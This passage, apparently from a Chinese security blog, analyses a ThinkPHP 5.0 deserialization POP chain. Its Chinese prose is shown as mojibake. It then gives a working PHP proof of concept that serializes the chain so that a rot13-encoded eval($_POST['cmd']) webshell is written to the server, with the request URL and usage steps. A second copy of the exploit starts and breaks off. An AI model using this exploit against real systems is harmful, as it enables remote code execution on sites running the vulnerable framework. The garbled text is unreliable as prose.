<p>åœ¨è¿™é‡Œ$this-&gt;handleæ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯»æ‰¾èƒ½å†™webshellçš„write()æ–¹æ³•ï¼Œæ­¤æ¬¡é€‰æ‹©äº† think\session\driver\Memcache ç±»çš„write()æ–¹æ³•ã€‚<br><img src="https://img-blog.csdnimg.cn/1442d051b4cb417c94558088489ea941.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨è¿™é‡Œ$this-&gt;handleråˆæ˜¯å¯æ§çš„ï¼Œä½¿ç”¨äº†$this-&gt;handler-&gt;setæ–¹æ³•ã€‚</p>
<p>æˆ‘ä»¬ç»§ç»­å¯»æ‰¾èƒ½å†™webshellçš„set()æ–¹æ³•ï¼Œæ­¤æ¬¡é€‰æ‹©äº†think\cache\driver\File ç±»ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/bc78cbc235904f21aed20ed0b4bb67fd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°think\cache\driver\File ç±»çš„set()æ–¹æ³•é€šè¿‡file_put_contents()å°†$dataå†™è¿›äº†$filenameæ–‡ä»¶ï¼Œæˆ‘ä»¬è·Ÿè¿›$dataå’Œ$filenameï¼Œçœ‹$dataä¸$filenameæ˜¯å¦å¯æ§ã€‚</p>
<p>å¾€ä¸Šè·Ÿè¿›å‘ç°$filenameçš„å€¼æ˜¯ç”±getCacheKey()æ–¹æ³•å†³å®šçš„ï¼Œæˆ‘ä»¬è·Ÿè¿›getCacheKey()å‡½æ•°ã€‚<br><img src="https://img-blog.csdnimg.cn/99ed006063714fbe9e1dd1f00cb76f98.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ä»getCacheKey()å‡½æ•°80è¡Œå¤„çš„è¯­å¥æˆ‘ä»¬å¯ä»¥çŸ¥é“$filenameçš„åç¼€æ˜¯å†™æ­»çš„ï¼Œä¸ºphpï¼Œå¹¶ä¸”æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†<code>options[&#39;path&#39;]</code>å¯æ§ã€‚</p>
<p>è¿™æ—¶å¦‚æœ$dataå¯æ§çš„è¯å°±å¯ä»¥getshelläº†ã€‚<br>æˆ‘ä»¬è·Ÿè¿›$dataï¼Œå‘ç°$dataæœ€ç»ˆæ˜¯ç”±think\console\Outputç±»çš„write()æ–¹æ³•å†³å®šçš„ï¼Œ$dataçš„å€¼ä¸ºtrueï¼Œå·²ç»è¢«å†™æ­»äº†ã€‚</p>
<p>è¿™æ ·å°±è¯´æ˜äº†file_put_contents()å‡½æ•°èƒ½å†™å…¥phpæ–‡ä»¶ï¼Œä½†å†…å®¹ä¸å¯æ§ï¼Œæ— æ³•å†™shellã€‚</p>
<p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå‘ç°æœ‰ä¸ªsetTagItem()å‡½æ•°ï¼Œè·Ÿè¿›è¯¥å‡½æ•°çœ‹çœ‹ã€‚<br><img src="https://img-blog.csdnimg.cn/4c14ea7c5f6d4f82be9caedd41e4cd8c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨setTagItem()å‡½æ•°ä¸­åˆä¸€æ¬¡è°ƒç”¨äº†set()å‡½æ•°ï¼Œå¹¶ä¸”è¿™æ¬¡çš„$keyæ˜¯å¯æ§çš„ï¼Œ$valueç”±ä¹‹å‰çš„$filenameå†³å®šï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡setTagItem()å†ä¸€æ¬¡çš„å†™å…¥phpæ–‡ä»¶è¿›è¡Œgetshellã€‚</p>
<p>åˆ°è¿™é‡Œæ•´ä¸ªpopé“¾å·²ç»æ¢³ç†å®Œäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åˆ©ç”¨è¿™æ¡popé“¾è¿›è¡Œgetshellã€‚</p>
<h1 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h1><p>åˆ©ç”¨çš„æ—¶å€™æˆ‘ä»¬é¦–å…ˆéœ€è¦ç»•è¿‡exit()çš„é™åˆ¶ï¼Œå› ä¸ºåˆ©ç”¨file_put_contents()å†™å…¥æ–‡ä»¶æ—¶å†…å®¹æœ‰exit()å‡½æ•°å¹¶ä¸”åœ¨æ¯”è¾ƒé å‰çš„ä½ç½®ï¼Œå¦‚æœæ‰§è¡Œåˆ°äº†exit()å‡½æ•°å°±ä¼šè‡ªåŠ¨é€€å‡ºï¼Œä¸ä¼šæ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„shellï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œè¿™é‡Œç”¨åˆ°phpçš„ä¼ªåè®®ç¼–ç è¿›è¡Œç»•è¿‡ã€‚</p>
<blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨ä¼ªåè®®å³å¯å¯¹exit()å‡½æ•°è¿›è¡Œç»•è¿‡</p>
</blockquote>
<p>åˆ°è¿™é‡Œæˆ‘ä»¬å…¶å®å¯ä»¥å†™å‡ºæ•´ä¸ªpayloadäº†ï¼Œä½†æ˜¯ç›®å‰åªèƒ½å†™å‡ºLinuxä¸‹çš„payloadã€‚</p>
<p>å…ˆæ¢³ç†ä¸€ä¸‹é“¾å­ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">Windowsç±»çš„__destruct()--&gt;removeFiles()--&gt;Modelç±»çš„__tostring()--&gt;toJson()--&gt;toArray()--&gt;Outputç±»çš„__call()--&gt;block()--&gt;writeln()--&gt;write()--&gt;Memcacheç±»çš„write()--&gt;Fileç±»çš„set()--&gt;Driverç±»çš„setTagItem()--&gt;Fileç±»çš„set()--&gt;file_put_contentså†™å…¥shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="linuxä¸‹çš„poc-æ³¨é‡Šç‰ˆ"><a href="#linuxä¸‹çš„poc-æ³¨é‡Šç‰ˆ" class="headerlink" title="linuxä¸‹çš„poc(æ³¨é‡Šç‰ˆ"></a>linuxä¸‹çš„poc(æ³¨é‡Šç‰ˆ</h2><p>linuxä¸‹çš„tp5.0ååºåˆ—åŒ–çš„pocç¼–å†™ï¼ˆæœ‰è¯¦ç»†æ³¨é‡Šç‰ˆï¼‰ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
ååºåˆ—åŒ–çš„èµ·ç‚¹æ˜¯Windowsç±»é‡Œçš„__destructæ–¹æ³•ï¼Œæ‰€ä»¥æŠŠWindowsç±»æŠ„è¿‡æ¥ã€‚
å·²çŸ¥Windowsç±»è¿™æ®µçš„é“¾å­æ˜¯ï¼š
	__destruct()-->removeFiles()-->file_exists()-->Modelç±»çš„__tostring()
å…¶ä¸­file_existsçš„å‚æ•°ç”±Windowsç±»çš„fileså±æ€§å†³å®šï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶filesæ˜¯æŸä¸ªç±»çš„å¯¹è±¡ï¼Œæ‰€ä»¥æŠŠfileså±æ€§æŠ„è¿‡æ¥ã€‚
filesçš„å€¼åº”é€‰æ‹©æœ‰tostringæ–¹æ³•ä¸”èƒ½åˆ©ç”¨çš„ç±»ã€‚
*/</span>
<span class="token comment">/* 
å…³äºè¿™é‡Œnamespaceå’Œuseçš„ä½¿ç”¨ï¼š
1.namespaceå°±ç›´æ¥æŠ„åŸæ¥çš„å°±è¡Œã€‚
2.useåé¢çš„å€¼å°±è¦å¡«æœ¬ç±»é‡Œnewè¿‡çš„ç±»çš„namespaceã€‚
	æ¯”å¦‚Windowsç±»é‡Œnewäº†Pivotç±»ï¼Œé‚£å°±è¦åœ¨Windowsç±»çš„å‰é¢å†™ä¸Šuse &lt;Pivotç±»æ‰€åœ¨çš„namespace>\Pivotï¼Œä¹Ÿå°±æ˜¯use think\model\Pivotã€‚
*/</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//---------------------------------------------------------------------------</span>

<span class="token comment">/*
æœ¬æ¥æ˜¯è§¦å‘Modelç±»çš„tostringæ–¹æ³•ï¼Œä½†æ˜¯Modelæ˜¯æŠ½è±¡ç±»(abstract)ï¼Œä¸èƒ½å®ä¾‹åŒ–(new)ã€‚
è€ŒPivotç±»ç»§æ‰¿äº†Modelç±»ï¼Œæ‹¥æœ‰Modelç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œæ‰€ä»¥ç”¨Pivotç±»å¯ä»¥è¾¾åˆ°ä¸€æ ·çš„æ•ˆæœï¼ŒæŠŠPivotç±»æŠ„è¿‡æ¥ã€‚
è¿™æ®µçš„é“¾å­æ˜¯ï¼š
	__tostring()-->toJson()-->toArray()
ä¸»è¦æ˜¯toArray()æ–¹æ³•çš„åˆ©ç”¨ã€‚æ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œæˆ‘ä»¬æƒ³è¦åˆ©ç”¨$value->getAttr($attr)è§¦å‘callæ–¹æ³•ï¼Œå°±è¦æ§åˆ¶valueçš„å€¼ã€‚
1.æ§åˆ¶$append-->æ§åˆ¶$name-->æ§åˆ¶$relation,è€Œ$relationè¦='getError'ï¼Œæ‰€ä»¥$append=array('getError');!!!
2.$modelRelationç­‰äº$relation()çš„è¿”å›å€¼ä¹Ÿå°±æ˜¯getError()çš„è¿”å›å€¼ï¼Œä¹Ÿå°±æ˜¯$errorçš„å€¼ã€‚
	$modelRelationè¿˜å¾—æ˜¯Relationçš„å¯¹è±¡ã€‚æ‰€ä»¥$errorå°±è¦æ˜¯Relationçš„å¯¹è±¡ã€‚ä½†æ˜¯Relationæ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½å®ä¾‹åŒ–ã€‚
	æˆ‘ä»¬æ‰¾æ‰¾ç»§æ‰¿äº†Relationç±»çš„ç±»ï¼ŒOneToOneç±»ç»§æ‰¿äº†Relationç±»ï¼ŒBelongsToç±»ç»§æ‰¿äº†OneToOneç±»ã€‚
	æ‰€ä»¥å¯ä»¥$error=new BelongsTo();!!!
3.getRelationDataçš„ä¸‰ä¸ªifï¼š
	-Modelç±»çš„parentä¸ä¸ºç©ºã€‚
	-Relationç±»çš„selfRelationè¦ä¸ºå‡,selfRelation=false;!!!ã€‚
	-Relationç±»çš„queryè°ƒç”¨çš„getModel()å‡½æ•°è¿”å›å€¼è¦ç­‰äºModelç±»çš„parentã€‚
		Modelç±»çš„parentå¯æ§ï¼ŒRelationç±»çš„queryå¯æ§ï¼Œæˆ‘ä»¬æ‰¾å­˜åœ¨å¯æ§çš„getModel()å‡½æ•°çš„ç±»å³å¯ã€‚
		è¿™é‡Œç”¨Queryç±»ï¼Œå¯æ§å˜é‡ä¸ºmodelã€‚

è¿™é‡Œé€‰æ‹©è§¦å‘Outputç±»çš„callæ–¹æ³•ï¼Œæ‰€ä»¥
Pivotç±»çš„parentå’ŒQueryç±»çš„modeléƒ½ç­‰äºnew Output();!!!

4.ä¸¤ä¸ªif
	-BelongsToç±»è¦æœ‰getBindAttr()å‡½æ•°ï¼Œå› ä¸ºOneToOneç±»æœ‰getBindAttr()å‡½æ•°ï¼Œè€ŒBelongsToç±»ç»§æ‰¿äº†OneToOneç±»ï¼Œæ‰€ä»¥åˆšå¥½æ»¡è¶³ã€‚
	-$bindAtträ¸ä¸ºç©º-->BelongsToç±»çš„getBindAttr()çš„è¿”å›å€¼ä¸ä¸ºç©º-->BelongsToç±»çš„bindAttrå±æ€§ä¸ä¸ºç©ºã€‚
		æ‰€ä»¥éšä¾¿èµ‹ä¸ªå€¼bindAttr=array('hacker')

*/</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//---------------------------------------------------------------------------</span>
<span class="token comment">/*
$valueä¸ºOutputçš„å¯¹è±¡ï¼Œ$value->getAttr($attr)è§¦å‘Outputç±»çš„callæ–¹æ³•ã€‚
è¿™æ®µé“¾å­ï¼š
	__call()-->block()-->writeln()-->write()
1.$methodå·²çŸ¥æ˜¯getAttrï¼Œæ‰€ä»¥è¦è¿›å…¥ç¬¬ä¸€ä¸ªifï¼Œæˆ‘ä»¬æ§åˆ¶$styles = ['getAttr'];!!!
2.è·Ÿè·Ÿè·Ÿè·Ÿåˆ°äº†write(),handleå¯æ§ï¼Œæˆ‘ä»¬è°ƒç”¨Memcacheç±»çš„write
	æ‰€ä»¥æ§åˆ¶handle=new Memcache();!!!
*/</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
handlerå¯æ§ï¼Œè°ƒç”¨setï¼Œè¿™é‡Œé€‰æ‹©å»è°ƒç”¨Fileç±»çš„setæ–¹æ³•ã€‚
æ‰€ä»¥æ§åˆ¶handler=new File();!!!
*/</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
åˆ©ç”¨setTagItem()æ–¹æ³•æ§åˆ¶filenameå’Œdataã€‚
setTagItem()æ–¹æ³•åœ¨Driverç±»é‡Œï¼Œè€ŒFileç±»ç»§æ‰¿äº†Driverç±»ï¼Œæœ‰Driverç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚
setTagItem()æ–¹æ³•çš„ç¬¬ä¸€ä¸ªifè¦tagå±æ€§ä¸ä¸ºç©ºï¼Œæˆ‘ä»¬éšä¾¿ç»™ä¸€ä¸ªå€¼:$tag='hacker';!!!
$filenameæ¥è‡ªgetCacheKey()çš„è¿”å›å€¼ã€‚
getCacheKey()å‡½æ•°å‰ä¸¤ä¸ªifä¸ç”¨è¿›å»ï¼Œæ‰€ä»¥æ§åˆ¶options['cache_subdir']=falseï¼Œoptions['prefix']=''ã€‚
$filenameä¸options['path']æœ‰å…³ã€‚æ‰€ä»¥æ§åˆ¶options['path']=>'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'
ä¼ªåè®®ç¼–ç ç»•è¿‡exit()ã€‚
*/</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$options</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span><span class="token operator">=</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
http://xxxxx/public/?s=/index/index/test&amp;c=åºåˆ—åŒ–åçš„ç»“æœ
ç„¶åè®¿é—®
http://xxxxx/public/%3C%3Fcuc%20%40riny(%24_CBFG%5B'pzq'%5D)%3B%3F%3E9eb29dfe314054b3d7d41b9c9b3e938c.php
POSTï¼šcmd=phpinfo();
*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="linuxä¸‹çš„poc-å¹²å‡€å«ç”Ÿç‰ˆ"><a href="#linuxä¸‹çš„poc-å¹²å‡€å«ç”Ÿç‰ˆ" class="headerlink" title="linuxä¸‹çš„poc(å¹²å‡€å«ç”Ÿç‰ˆ"></a>linuxä¸‹çš„poc(å¹²å‡€å«ç”Ÿç‰ˆ</h2><p>linuxä¸‹çš„tp5.0ååºåˆ—åŒ–åˆ©ç”¨pocï¼ˆå¹²å‡€å«ç”Ÿç‰ˆï¼‰:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
